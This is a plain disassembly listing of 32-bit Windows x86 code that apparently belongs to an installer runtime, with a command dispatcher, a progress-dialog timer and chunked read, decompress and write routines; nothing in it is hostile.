  402bbf:	e8 b4 05 00 00       	call   0x403178
  402bc4:	8b d8                	mov    %eax,%ebx
  402bc6:	ff 75 08             	push   0x8(%ebp)
  402bc9:	ff 15 bc 80 40 00    	call   *0x4080bc
  402bcf:	6a f3                	push   $0xfffffff3
  402bd1:	5e                   	pop    %esi
  402bd2:	85 db                	test   %ebx,%ebx
  402bd4:	7d 13                	jge    0x402be9
  402bd6:	6a ef                	push   $0xffffffef
  402bd8:	5e                   	pop    %esi
  402bd9:	ff 75 cc             	push   -0x34(%ebp)
  402bdc:	ff 15 70 81 40 00    	call   *0x408170
  402be2:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402be9:	56                   	push   %esi
  402bea:	e9 7d ec ff ff       	jmp    0x40186c
  402bef:	33 c9                	xor    %ecx,%ecx
  402bf1:	e8 10 e9 ff ff       	call   0x401506
  402bf6:	8b f8                	mov    %eax,%edi
  402bf8:	3b 3d ec 45 47 00    	cmp    0x4745ec,%edi
  402bfe:	0f 83 dd eb ff ff    	jae    0x4017e1
  402c04:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402c07:	8b f7                	mov    %edi,%esi
  402c09:	69 f6 20 40 00 00    	imul   $0x4020,%esi,%esi
  402c0f:	03 35 e8 45 47 00    	add    0x4745e8,%esi
  402c15:	85 c0                	test   %eax,%eax
  402c17:	7c 15                	jl     0x402c2e
  402c19:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402c1c:	75 0a                	jne    0x402c28
  402c1e:	83 c6 18             	add    $0x18,%esi
  402c21:	56                   	push   %esi
  402c22:	53                   	push   %ebx
  402c23:	e9 bd fe ff ff       	jmp    0x402ae5
  402c28:	51                   	push   %ecx
  402c29:	e9 39 fe ff ff       	jmp    0x402a67
  402c2e:	83 c9 ff             	or     $0xffffffff,%ecx
  402c31:	2b c8                	sub    %eax,%ecx
  402c33:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  402c36:	74 0d                	je     0x402c45
  402c38:	33 c9                	xor    %ecx,%ecx
  402c3a:	41                   	inc    %ecx
  402c3b:	e8 c6 e8 ff ff       	call   0x401506
  402c40:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402c43:	eb 13                	jmp    0x402c58
  402c45:	ff 75 ec             	push   -0x14(%ebp)
  402c48:	8d 46 18             	lea    0x18(%esi),%eax
  402c4b:	50                   	push   %eax
  402c4c:	e8 ff 39 00 00       	call   0x406650
  402c51:	81 4e 08 00 01 00 00 	orl    $0x100,0x8(%esi)
  402c58:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  402c5b:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402c5e:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402c61:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  402c65:	0f 84 ad 00 00 00    	je     0x402d18
  402c6b:	57                   	push   %edi
  402c6c:	e8 15 e5 ff ff       	call   0x401186
  402c71:	e9 a2 00 00 00       	jmp    0x402d18
  402c76:	33 c9                	xor    %ecx,%ecx
  402c78:	e8 89 e8 ff ff       	call   0x401506
  402c7d:	83 f8 20             	cmp    $0x20,%eax
  402c80:	0f 83 5b eb ff ff    	jae    0x4017e1
  402c86:	33 f6                	xor    %esi,%esi
  402c88:	39 75 e8             	cmp    %esi,-0x18(%ebp)
  402c8b:	74 1f                	je     0x402cac
  402c8d:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  402c90:	74 0f                	je     0x402ca1
  402c92:	50                   	push   %eax
  402c93:	e8 0e e6 ff ff       	call   0x4012a6
  402c98:	56                   	push   %esi
  402c99:	56                   	push   %esi
  402c9a:	e8 59 e5 ff ff       	call   0x4011f8
  402c9f:	eb 77                	jmp    0x402d18
  402ca1:	56                   	push   %esi
  402ca2:	e8 4a e6 ff ff       	call   0x4012f1
  402ca7:	e9 ba fd ff ff       	jmp    0x402a66
  402cac:	39 75 e4             	cmp    %esi,-0x1c(%ebp)
  402caf:	74 12                	je     0x402cc3
  402cb1:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402cb4:	8b 15 dc 45 47 00    	mov    0x4745dc,%edx
  402cba:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  402cc1:	eb 55                	jmp    0x402d18
  402cc3:	8b 0d dc 45 47 00    	mov    0x4745dc,%ecx
  402cc9:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402cd0:	53                   	push   %ebx
  402cd1:	e8 7a 39 00 00       	call   0x406650
  402cd6:	eb 40                	jmp    0x402d18
  402cd8:	8b 0d 94 a2 45 00    	mov    0x45a294,%ecx
  402cde:	6a 00                	push   $0x0
  402ce0:	23 c8                	and    %eax,%ecx
  402ce2:	51                   	push   %ecx
  402ce3:	6a 0b                	push   $0xb
  402ce5:	ff 75 f8             	push   -0x8(%ebp)
  402ce8:	ff 15 7c 82 40 00    	call   *0x40827c
  402cee:	83 7d dc 00          	cmpl   $0x0,-0x24(%ebp)
  402cf2:	74 24                	je     0x402d18
  402cf4:	6a 00                	push   $0x0
  402cf6:	6a 00                	push   $0x0
  402cf8:	ff 75 f8             	push   -0x8(%ebp)
  402cfb:	ff 15 78 82 40 00    	call   *0x408278
  402d01:	eb 15                	jmp    0x402d18
  402d03:	33 f6                	xor    %esi,%esi
  402d05:	46                   	inc    %esi
  402d06:	e8 11 e8 ff ff       	call   0x40151c
  402d0b:	50                   	push   %eax
  402d0c:	e8 e5 34 00 00       	call   0x4061f6
  402d11:	50                   	push   %eax
  402d12:	57                   	push   %edi
  402d13:	e8 fe 31 00 00       	call   0x405f16
  402d18:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402d1b:	01 05 88 46 47 00    	add    %eax,0x474688
  402d21:	33 c0                	xor    %eax,%eax
  402d23:	5f                   	pop    %edi
  402d24:	5e                   	pop    %esi
  402d25:	5b                   	pop    %ebx
  402d26:	c9                   	leave
  402d27:	c2 04 00             	ret    $0x4
  402d2a:	8b ff                	mov    %edi,%edi
  402d2c:	23 2d 40 00 bd 16    	and    0x16bd0040,%ebp
  402d32:	40                   	inc    %eax
  402d33:	00 cf                	add    %cl,%bh
  402d35:	16                   	push   %ss
  402d36:	40                   	inc    %eax
  402d37:	00 e5                	add    %ah,%ch
  402d39:	16                   	push   %ss
  402d3a:	40                   	inc    %eax
  402d3b:	00 f9                	add    %bh,%cl
  402d3d:	16                   	push   %ss
  402d3e:	40                   	inc    %eax
  402d3f:	00 06                	add    %al,(%esi)
  402d41:	17                   	pop    %ss
  402d42:	40                   	inc    %eax
  402d43:	00 21                	add    %ah,(%ecx)
  402d45:	17                   	pop    %ss
  402d46:	40                   	inc    %eax
  402d47:	00 99 17 40 00 c7    	add    %bl,-0x38ffbfe9(%ecx)
  402d4d:	17                   	pop    %ss
  402d4e:	40                   	inc    %eax
  402d4f:	00 ed                	add    %ch,%ch
  402d51:	17                   	pop    %ss
  402d52:	40                   	inc    %eax
  402d53:	00 76 18             	add    %dh,0x18(%esi)
  402d56:	40                   	inc    %eax
  402d57:	00 2f                	add    %ch,(%edi)
  402d59:	17                   	pop    %ss
  402d5a:	40                   	inc    %eax
  402d5b:	00 6c 17 40          	add    %ch,0x40(%edi,%edx,1)
  402d5f:	00 8d 17 40 00 93    	add    %cl,-0x6cffbfe9(%ebp)
  402d65:	18 40 00             	sbb    %al,0x0(%eax)
  402d68:	e2 18                	loop   0x402d82
  402d6a:	40                   	inc    %eax
  402d6b:	00 4d 19             	add    %cl,0x19(%ebp)
  402d6e:	40                   	inc    %eax
  402d6f:	00 83 19 40 00 97    	add    %al,-0x68ffbfe7(%ebx)
  402d75:	19 40 00             	sbb    %eax,0x0(%eax)
  402d78:	3b 1b                	cmp    (%ebx),%ebx
  402d7a:	40                   	inc    %eax
  402d7b:	00 50 1b             	add    %dl,0x1b(%eax)
  402d7e:	40                   	inc    %eax
  402d7f:	00 87 1b 40 00 8c    	add    %al,-0x73ffbfe5(%edi)
  402d85:	1b 40 00             	sbb    0x0(%eax),%eax
  402d88:	9f                   	lahf
  402d89:	1b 40 00             	sbb    0x0(%eax),%eax
  402d8c:	28 1c 40             	sub    %bl,(%eax,%eax,2)
  402d8f:	00 60 1c             	add    %ah,0x1c(%eax)
  402d92:	40                   	inc    %eax
  402d93:	00 a3 1c 40 00 dc    	add    %ah,-0x23ffbfe4(%ebx)
  402d99:	1c 40                	sbb    $0x40,%al
  402d9b:	00 66 1d             	add    %ah,0x1d(%esi)
  402d9e:	40                   	inc    %eax
  402d9f:	00 89 1d 40 00 36    	add    %cl,0x3600401d(%ecx)
  402da5:	1e                   	push   %ds
  402da6:	40                   	inc    %eax
  402da7:	00 36                	add    %dh,(%esi)
  402da9:	1e                   	push   %ds
  402daa:	40                   	inc    %eax
  402dab:	00 06                	add    %al,(%esi)
  402dad:	1f                   	pop    %ds
  402dae:	40                   	inc    %eax
  402daf:	00 19                	add    %bl,(%ecx)
  402db1:	1f                   	pop    %ds
  402db2:	40                   	inc    %eax
  402db3:	00 36                	add    %dh,(%esi)
  402db5:	1f                   	pop    %ds
  402db6:	40                   	inc    %eax
  402db7:	00 53 1f             	add    %dl,0x1f(%ebx)
  402dba:	40                   	inc    %eax
  402dbb:	00 b0 1f 40 00 2c    	add    %dh,0x2c00401f(%eax)
  402dc1:	20 40 00             	and    %al,0x0(%eax)
  402dc4:	5b                   	pop    %ebx
  402dc5:	20 40 00             	and    %al,0x0(%eax)
  402dc8:	be 20 40 00 3d       	mov    $0x3d004020,%esi
  402dcd:	21 40 00             	and    %eax,0x0(%eax)
  402dd0:	6f                   	outsl  %ds:(%esi),(%dx)
  402dd1:	21 40 00             	and    %eax,0x0(%eax)
  402dd4:	04 22                	add    $0x22,%al
  402dd6:	40                   	inc    %eax
  402dd7:	00 d8                	add    %bl,%al
  402dd9:	22 40 00             	and    0x0(%eax),%al
  402ddc:	10 24 40             	adc    %ah,(%eax,%eax,2)
  402ddf:	00 98 24 40 00 ae    	add    %bl,-0x51ffbfdc(%eax)
  402de5:	24 40                	and    $0x40,%al
  402de7:	00 fc                	add    %bh,%ah
  402de9:	24 40                	and    $0x40,%al
  402deb:	00 4e 25             	add    %cl,0x25(%esi)
  402dee:	40                   	inc    %eax
  402def:	00 b8 25 40 00 81    	add    %bh,-0x7effbfdb(%eax)
  402df5:	26 40                	es inc %eax
  402df7:	00 08                	add    %cl,(%eax)
  402df9:	27                   	daa
  402dfa:	40                   	inc    %eax
  402dfb:	00 6c 27 40          	add    %ch,0x40(%edi,%eiz,1)
  402dff:	00 88 27 40 00 af    	add    %cl,-0x50ffbfd9(%eax)
  402e05:	27                   	daa
  402e06:	40                   	inc    %eax
  402e07:	00 2f                	add    %ch,(%edi)
  402e09:	28 40 00             	sub    %al,0x0(%eax)
  402e0c:	1a 29                	sbb    (%ecx),%ch
  402e0e:	40                   	inc    %eax
  402e0f:	00 6b 29             	add    %ch,0x29(%ebx)
  402e12:	40                   	inc    %eax
  402e13:	00 37                	add    %dh,(%edi)
  402e15:	2a 40 00             	sub    0x0(%eax),%al
  402e18:	6d                   	insl   (%dx),%es:(%edi)
  402e19:	2a 40 00             	sub    0x0(%eax),%al
  402e1c:	89 2a                	mov    %ebp,(%edx)
  402e1e:	40                   	inc    %eax
  402e1f:	00 b1 2a 40 00 ef    	add    %dh,-0x10ffbfd6(%ecx)
  402e25:	2a 40 00             	sub    0x0(%eax),%al
  402e28:	ef                   	out    %eax,(%dx)
  402e29:	2b 40 00             	sub    0x0(%eax),%eax
  402e2c:	76 2c                	jbe    0x402e5a
  402e2e:	40                   	inc    %eax
  402e2f:	00 18                	add    %bl,(%eax)
  402e31:	2d 40 00 18 2d       	sub    $0x2d180040,%eax
  402e36:	40                   	inc    %eax
  402e37:	00 d8                	add    %bl,%al
  402e39:	2c 40                	sub    $0x40,%al
  402e3b:	00 03                	add    %al,(%ebx)
  402e3d:	2d 40 00 01 1d       	sub    $0x1d010040,%eax
  402e42:	40                   	inc    %eax
  402e43:	00 05 1d 40 00 09    	add    %al,0x900401d
  402e49:	1d 40 00 10 1d       	sbb    $0x1d100040,%eax
  402e4e:	40                   	inc    %eax
  402e4f:	00 22                	add    %ah,(%edx)
  402e51:	1d 40 00 26 1d       	sbb    $0x1d260040,%eax
  402e56:	40                   	inc    %eax
  402e57:	00 2a                	add    %ch,(%edx)
  402e59:	1d 40 00 2e 1d       	sbb    $0x1d2e0040,%eax
  402e5e:	40                   	inc    %eax
  402e5f:	00 39                	add    %bh,(%ecx)
  402e61:	1d 40 00 45 1d       	sbb    $0x1d450040,%eax
  402e66:	40                   	inc    %eax
  402e67:	00 4d 1d             	add    %cl,0x1d(%ebp)
  402e6a:	40                   	inc    %eax
  402e6b:	00 5a 1d             	add    %bl,0x1d(%edx)
  402e6e:	40                   	inc    %eax
  402e6f:	00 5e 1d             	add    %bl,0x1d(%esi)
  402e72:	40                   	inc    %eax
  402e73:	00 8b 0d 54 e1 41    	add    %cl,0x41e1540d(%ebx)
  402e79:	00 a1 e0 e1 42 00    	add    %ah,0x42e1e0(%ecx)
  402e7f:	3b c8                	cmp    %eax,%ecx
  402e81:	7c 02                	jl     0x402e85
  402e83:	8b c8                	mov    %eax,%ecx
  402e85:	50                   	push   %eax
  402e86:	6a 64                	push   $0x64
  402e88:	51                   	push   %ecx
  402e89:	ff 15 4c 81 40 00    	call   *0x40814c
  402e8f:	c3                   	ret
  402e90:	55                   	push   %ebp
  402e91:	8b ec                	mov    %esp,%ebp
  402e93:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402e99:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  402ea0:	75 19                	jne    0x402ebb
  402ea2:	6a 00                	push   $0x0
  402ea4:	68 fa 00 00 00       	push   $0xfa
  402ea9:	6a 01                	push   $0x1
  402eab:	ff 75 08             	push   0x8(%ebp)
  402eae:	ff 15 28 82 40 00    	call   *0x408228
  402eb4:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  402ebb:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  402ec2:	75 45                	jne    0x402f09
  402ec4:	e8 ab ff ff ff       	call   0x402e74
  402ec9:	83 3d dc 45 47 00 00 	cmpl   $0x0,0x4745dc
  402ed0:	b9 08 83 40 00       	mov    $0x408308,%ecx
  402ed5:	75 05                	jne    0x402edc
  402ed7:	b9 d4 82 40 00       	mov    $0x4082d4,%ecx
  402edc:	50                   	push   %eax
  402edd:	51                   	push   %ecx
  402ede:	8d 45 80             	lea    -0x80(%ebp),%eax
  402ee1:	50                   	push   %eax
  402ee2:	ff 15 3c 82 40 00    	call   *0x40823c
  402ee8:	83 c4 0c             	add    $0xc,%esp
  402eeb:	8d 45 80             	lea    -0x80(%ebp),%eax
  402eee:	50                   	push   %eax
  402eef:	ff 75 08             	push   0x8(%ebp)
  402ef2:	ff 15 2c 82 40 00    	call   *0x40822c
  402ef8:	8d 45 80             	lea    -0x80(%ebp),%eax
  402efb:	50                   	push   %eax
  402efc:	68 06 04 00 00       	push   $0x406
  402f01:	ff 75 08             	push   0x8(%ebp)
  402f04:	e8 db 2c 00 00       	call   0x405be4
  402f09:	33 c0                	xor    %eax,%eax
  402f0b:	c9                   	leave
  402f0c:	c2 10 00             	ret    $0x10
  402f0f:	55                   	push   %ebp
  402f10:	8b ec                	mov    %esp,%ebp
  402f12:	81 ec 80 00 00 00    	sub    $0x80,%esp
  402f18:	56                   	push   %esi
  402f19:	33 f6                	xor    %esi,%esi
  402f1b:	39 75 08             	cmp    %esi,0x8(%ebp)
  402f1e:	74 18                	je     0x402f38
  402f20:	a1 50 e1 41 00       	mov    0x41e150,%eax
  402f25:	3b c6                	cmp    %esi,%eax
  402f27:	74 07                	je     0x402f30
  402f29:	50                   	push   %eax
  402f2a:	ff 15 20 82 40 00    	call   *0x408220
  402f30:	89 35 50 e1 41 00    	mov    %esi,0x41e150
  402f36:	eb 76                	jmp    0x402fae
  402f38:	39 35 50 e1 41 00    	cmp    %esi,0x41e150
  402f3e:	74 08                	je     0x402f48
  402f40:	56                   	push   %esi
  402f41:	e8 36 32 00 00       	call   0x40617c
  402f46:	eb 66                	jmp    0x402fae
  402f48:	ff 15 90 80 40 00    	call   *0x408090
  402f4e:	3b 05 20 46 47 00    	cmp    0x474620,%eax
  402f54:	76 58                	jbe    0x402fae
  402f56:	39 35 d4 45 47 00    	cmp    %esi,0x4745d4
  402f5c:	74 2d                	je     0x402f8b
  402f5e:	f6 05 b4 46 47 00 01 	testb  $0x1,0x4746b4
  402f65:	74 47                	je     0x402fae
  402f67:	e8 08 ff ff ff       	call   0x402e74
  402f6c:	50                   	push   %eax
  402f6d:	8d 45 80             	lea    -0x80(%ebp),%eax
  402f70:	68 34 83 40 00       	push   $0x408334
  402f75:	50                   	push   %eax
  402f76:	ff 15 3c 82 40 00    	call   *0x40823c
  402f7c:	83 c4 0c             	add    $0xc,%esp
  402f7f:	8d 45 80             	lea    -0x80(%ebp),%eax
  402f82:	50                   	push   %eax
  402f83:	56                   	push   %esi
  402f84:	e8 09 1f 00 00       	call   0x404e92
  402f89:	eb 23                	jmp    0x402fae
  402f8b:	56                   	push   %esi
  402f8c:	68 90 2e 40 00       	push   $0x402e90
  402f91:	56                   	push   %esi
  402f92:	6a 6f                	push   $0x6f
  402f94:	ff 35 d8 45 47 00    	push   0x4745d8
  402f9a:	ff 15 24 82 40 00    	call   *0x408224
  402fa0:	6a 05                	push   $0x5
  402fa2:	50                   	push   %eax
  402fa3:	a3 50 e1 41 00       	mov    %eax,0x41e150
  402fa8:	ff 15 38 82 40 00    	call   *0x408238
  402fae:	5e                   	pop    %esi
  402faf:	c9                   	leave
  402fb0:	c3                   	ret
  402fb1:	55                   	push   %ebp
  402fb2:	8b ec                	mov    %esp,%ebp
  402fb4:	56                   	push   %esi
  402fb5:	8b 75 0c             	mov    0xc(%ebp),%esi
  402fb8:	6a 00                	push   $0x0
  402fba:	8d 45 0c             	lea    0xc(%ebp),%eax
  402fbd:	50                   	push   %eax
  402fbe:	56                   	push   %esi
  402fbf:	ff 75 08             	push   0x8(%ebp)
  402fc2:	ff 35 10 a0 40 00    	push   0x40a010
  402fc8:	ff 15 58 81 40 00    	call   *0x408158
  402fce:	85 c0                	test   %eax,%eax
  402fd0:	74 0a                	je     0x402fdc
  402fd2:	39 75 0c             	cmp    %esi,0xc(%ebp)
  402fd5:	75 05                	jne    0x402fdc
  402fd7:	33 c0                	xor    %eax,%eax
  402fd9:	40                   	inc    %eax
  402fda:	eb 02                	jmp    0x402fde
  402fdc:	33 c0                	xor    %eax,%eax
  402fde:	5e                   	pop    %esi
  402fdf:	5d                   	pop    %ebp
  402fe0:	c2 08 00             	ret    $0x8
  402fe3:	6a 00                	push   $0x0
  402fe5:	6a 00                	push   $0x0
  402fe7:	ff 74 24 0c          	push   0xc(%esp)
  402feb:	ff 35 10 a0 40 00    	push   0x40a010
  402ff1:	ff 15 60 81 40 00    	call   *0x408160
  402ff7:	c2 04 00             	ret    $0x4
  402ffa:	51                   	push   %ecx
  402ffb:	53                   	push   %ebx
  402ffc:	55                   	push   %ebp
  402ffd:	56                   	push   %esi
  402ffe:	8b 35 e4 e1 42 00    	mov    0x42e1e4,%esi
  403004:	2b 35 f0 21 43 00    	sub    0x4321f0,%esi
  40300a:	57                   	push   %edi
  40300b:	03 74 24 18          	add    0x18(%esp),%esi
  40300f:	ff 15 90 80 40 00    	call   *0x408090
  403015:	05 f4 01 00 00       	add    $0x1f4,%eax
  40301a:	33 db                	xor    %ebx,%ebx
  40301c:	3b f3                	cmp    %ebx,%esi
  40301e:	a3 20 46 47 00       	mov    %eax,0x474620
  403023:	0f 8e 2f 01 00 00    	jle    0x403158
  403029:	ff 35 ec 21 43 00    	push   0x4321ec
  40302f:	e8 af ff ff ff       	call   0x402fe3
  403034:	53                   	push   %ebx
  403035:	53                   	push   %ebx
  403036:	ff 35 f0 21 43 00    	push   0x4321f0
  40303c:	ff 35 14 a0 40 00    	push   0x40a014
  403042:	ff 15 60 81 40 00    	call   *0x408160
  403048:	89 35 e0 e1 42 00    	mov    %esi,0x42e1e0
  40304e:	89 1d 54 e1 41 00    	mov    %ebx,0x41e154
  403054:	bd e0 61 42 00       	mov    $0x4261e0,%ebp
  403059:	a1 e8 21 43 00       	mov    0x4321e8,%eax
  40305e:	2b 05 ec 21 43 00    	sub    0x4321ec,%eax
  403064:	bf 00 40 00 00       	mov    $0x4000,%edi
  403069:	3b c7                	cmp    %edi,%eax
  40306b:	7f 02                	jg     0x40306f
  40306d:	8b f8                	mov    %eax,%edi
  40306f:	57                   	push   %edi
  403070:	be e8 e1 42 00       	mov    $0x42e1e8,%esi
  403075:	56                   	push   %esi
  403076:	e8 36 ff ff ff       	call   0x402fb1
  40307b:	85 c0                	test   %eax,%eax
  40307d:	0f 84 e7 00 00 00    	je     0x40316a
  403083:	01 3d ec 21 43 00    	add    %edi,0x4321ec
  403089:	89 35 70 61 42 00    	mov    %esi,0x426170
  40308f:	89 3d 74 61 42 00    	mov    %edi,0x426174
  403095:	39 1d dc 45 47 00    	cmp    %ebx,0x4745dc
  40309b:	74 29                	je     0x4030c6
  40309d:	39 1d a0 46 47 00    	cmp    %ebx,0x4746a0
  4030a3:	75 21                	jne    0x4030c6
  4030a5:	a1 e0 e1 42 00       	mov    0x42e1e0,%eax
  4030aa:	2b 05 e4 e1 42 00    	sub    0x42e1e4,%eax
  4030b0:	53                   	push   %ebx
  4030b1:	2b 44 24 1c          	sub    0x1c(%esp),%eax
  4030b5:	03 05 f0 21 43 00    	add    0x4321f0,%eax
  4030bb:	a3 54 e1 41 00       	mov    %eax,0x41e154
  4030c0:	e8 4a fe ff ff       	call   0x402f0f
  4030c5:	59                   	pop    %ecx
  4030c6:	b9 58 61 42 00       	mov    $0x426158,%ecx
  4030cb:	89 2d 78 61 42 00    	mov    %ebp,0x426178
  4030d1:	c7 05 7c 61 42 00 00 	movl   $0x8000,0x42617c
  4030d8:	80 00 00 
  4030db:	e8 70 3c 00 00       	call   0x406d50
  4030e0:	85 c0                	test   %eax,%eax
  4030e2:	0f 8c 87 00 00 00    	jl     0x40316f
  4030e8:	8b 35 78 61 42 00    	mov    0x426178,%esi
  4030ee:	2b f5                	sub    %ebp,%esi
  4030f0:	74 32                	je     0x403124
  4030f2:	53                   	push   %ebx
  4030f3:	8d 44 24 14          	lea    0x14(%esp),%eax
  4030f7:	50                   	push   %eax
  4030f8:	56                   	push   %esi
  4030f9:	55                   	push   %ebp
  4030fa:	ff 35 14 a0 40 00    	push   0x40a014
  403100:	ff 15 54 81 40 00    	call   *0x408154
  403106:	85 c0                	test   %eax,%eax
  403108:	74 6a                	je     0x403174
  40310a:	3b 74 24 10          	cmp    0x10(%esp),%esi
  40310e:	75 64                	jne    0x403174
  403110:	01 35 f0 21 43 00    	add    %esi,0x4321f0
  403116:	39 1d 74 61 42 00    	cmp    %ebx,0x426174
  40311c:	0f 85 73 ff ff ff    	jne    0x403095
  403122:	eb 0c                	jmp    0x403130
  403124:	39 1d 74 61 42 00    	cmp    %ebx,0x426174
  40312a:	75 43                	jne    0x40316f
  40312c:	3b fb                	cmp    %ebx,%edi
  40312e:	74 3f                	je     0x40316f
  403130:	a1 e4 e1 42 00       	mov    0x42e1e4,%eax
  403135:	8b c8                	mov    %eax,%ecx
  403137:	2b 0d f0 21 43 00    	sub    0x4321f0,%ecx
  40313d:	03 4c 24 18          	add    0x18(%esp),%ecx
  403141:	85 c9                	test   %ecx,%ecx
  403143:	0f 8f 10 ff ff ff    	jg     0x403059
  403149:	53                   	push   %ebx
  40314a:	53                   	push   %ebx
  40314b:	50                   	push   %eax
  40314c:	ff 35 14 a0 40 00    	push   0x40a014
  403152:	ff 15 60 81 40 00    	call   *0x408160
  403158:	6a 01                	push   $0x1
  40315a:	e8 b0 fd ff ff       	call   0x402f0f
  40315f:	59                   	pop    %ecx
  403160:	33 c0                	xor    %eax,%eax
  403162:	5f                   	pop    %edi
  403163:	5e                   	pop    %esi
  403164:	5d                   	pop    %ebp
  403165:	5b                   	pop    %ebx
  403166:	59                   	pop    %ecx
  403167:	c2 04 00             	ret    $0x4
  40316a:	83 c8 ff             	or     $0xffffffff,%eax
  40316d:	eb f3                	jmp    0x403162
  40316f:	6a fd                	push   $0xfffffffd
  403171:	58                   	pop    %eax
  403172:	eb ee                	jmp    0x403162
  403174:	6a fe                	push   $0xfffffffe
  403176:	eb f9                	jmp    0x403171
  403178:	55                   	push   %ebp
  403179:	8b ec                	mov    %esp,%ebp
  40317b:	51                   	push   %ecx
  40317c:	51                   	push   %ecx
  40317d:	8b 45 08             	mov    0x8(%ebp),%eax
  403180:	56                   	push   %esi
  403181:	57                   	push   %edi
  403182:	33 ff                	xor    %edi,%edi
  403184:	3b c7                	cmp    %edi,%eax
  403186:	7c 1c                	jl     0x4031a4
  403188:	8b 0d 18 46 47 00    	mov    0x474618,%ecx
  40318e:	57                   	push   %edi
  40318f:	03 c1                	add    %ecx,%eax
  403191:	57                   	push   %edi
  403192:	50                   	push   %eax
  403193:	ff 35 14 a0 40 00    	push   0x40a014
  403199:	a3 e4 e1 42 00       	mov    %eax,0x42e1e4
  40319e:	ff 15 60 81 40 00    	call   *0x408160
  4031a4:	6a 04                	push   $0x4
  4031a6:	5e                   	pop    %esi
  4031a7:	56                   	push   %esi
  4031a8:	e8 4d fe ff ff       	call   0x402ffa
  4031ad:	3b c7                	cmp    %edi,%eax
  4031af:	0f 8c e8 00 00 00    	jl     0x40329d
  4031b5:	53                   	push   %ebx
  4031b6:	8b 1d 58 81 40 00    	mov    0x408158,%ebx
  4031bc:	57                   	push   %edi
  4031bd:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4031c0:	50                   	push   %eax
  4031c1:	56                   	push   %esi
  4031c2:	8d 45 08             	lea    0x8(%ebp),%eax
  4031c5:	50                   	push   %eax
  4031c6:	ff 35 14 a0 40 00    	push   0x40a014
  4031cc:	ff d3                	call   *%ebx
  4031ce:	85 c0                	test   %eax,%eax
  4031d0:	0f 84 c3 00 00 00    	je     0x403299
  4031d6:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  4031d9:	0f 85 ba 00 00 00    	jne    0x403299
  4031df:	ff 75 08             	push   0x8(%ebp)
  4031e2:	01 35 e4 e1 42 00    	add    %esi,0x42e1e4
  4031e8:	e8 0d fe ff ff       	call   0x402ffa
  4031ed:	3b c7                	cmp    %edi,%eax
  4031ef:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4031f2:	0f 8c a4 00 00 00    	jl     0x40329c
  4031f8:	39 7d 10             	cmp    %edi,0x10(%ebp)
  4031fb:	75 6b                	jne    0x403268
  4031fd:	39 7d 08             	cmp    %edi,0x8(%ebp)
  403200:	0f 8e 8e 00 00 00    	jle    0x403294
  403206:	be e8 e1 42 00       	mov    $0x42e1e8,%esi
  40320b:	bf 00 40 00 00       	mov    $0x4000,%edi
  403210:	39 7d 08             	cmp    %edi,0x8(%ebp)
  403213:	7d 03                	jge    0x403218
  403215:	8b 7d 08             	mov    0x8(%ebp),%edi
  403218:	6a 00                	push   $0x0
  40321a:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40321d:	50                   	push   %eax
  40321e:	57                   	push   %edi
  40321f:	56                   	push   %esi
  403220:	ff 35 14 a0 40 00    	push   0x40a014
  403226:	ff d3                	call   *%ebx
  403228:	85 c0                	test   %eax,%eax
  40322a:	74 6d                	je     0x403299
  40322c:	3b 7d fc             	cmp    -0x4(%ebp),%edi
  40322f:	75 68                	jne    0x403299
  403231:	6a 00                	push   $0x0
  403233:	8d 45 14             	lea    0x14(%ebp),%eax
  403236:	50                   	push   %eax
  403237:	ff 75 fc             	push   -0x4(%ebp)
  40323a:	56                   	push   %esi
  40323b:	ff 75 0c             	push   0xc(%ebp)
  40323e:	ff 15 54 81 40 00    	call   *0x408154
  403244:	85 c0                	test   %eax,%eax
  403246:	74 1c                	je     0x403264
  403248:	39 7d 14             	cmp    %edi,0x14(%ebp)
  40324b:	75 17                	jne    0x403264
  40324d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403250:	01 45 f8             	add    %eax,-0x8(%ebp)
  403253:	29 45 08             	sub    %eax,0x8(%ebp)
  403256:	01 05 e4 e1 42 00    	add    %eax,0x42e1e4
  40325c:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  403260:	7f a9                	jg     0x40320b
  403262:	eb 30                	jmp    0x403294
  403264:	6a fe                	push   $0xfffffffe
  403266:	eb 33                	jmp    0x40329b
  403268:	8b 45 08             	mov    0x8(%ebp),%eax
  40326b:	3b 45 14             	cmp    0x14(%ebp),%eax
  40326e:	7c 03                	jl     0x403273
  403270:	8b 45 14             	mov    0x14(%ebp),%eax
  403273:	57                   	push   %edi
  403274:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  403277:	51                   	push   %ecx
  403278:	50                   	push   %eax
  403279:	ff 75 10             	push   0x10(%ebp)
  40327c:	ff 35 14 a0 40 00    	push   0x40a014
  403282:	ff d3                	call   *%ebx
  403284:	85 c0                	test   %eax,%eax
  403286:	74 11                	je     0x403299
  403288:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40328b:	01 05 e4 e1 42 00    	add    %eax,0x42e1e4
  403291:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403294:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403297:	eb 03                	jmp    0x40329c
  403299:	6a fd                	push   $0xfffffffd
  40329b:	58                   	pop    %eax
  40329c:	5b                   	pop    %ebx
  40329d:	5f                   	pop    %edi
  40329e:	5e                   	pop    %esi
  40329f:	c9                   	leave
  4032a0:	c2 10 00             	ret    $0x10
